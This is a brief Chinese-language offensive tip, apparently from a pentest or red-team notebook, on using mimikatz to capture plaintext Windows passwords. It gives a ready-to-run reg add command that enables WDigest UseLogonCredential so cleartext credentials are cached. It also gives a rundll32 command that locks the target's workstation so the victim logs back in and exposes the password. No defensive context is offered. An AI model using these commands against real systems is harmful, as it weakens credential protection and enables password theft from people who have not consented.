mimikatz有一个功能是：对方处于锁屏状态时解锁，即可抓到明文密码，前提需要先修改一处注册表
```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1
```
命令行下锁屏
```
rundll32.exe user32.dll,LockWorkStation
```

参考链接：  
https://mp.weixin.qq.com/s/_OfE6XAGO7gRtMYWcOCGiQ
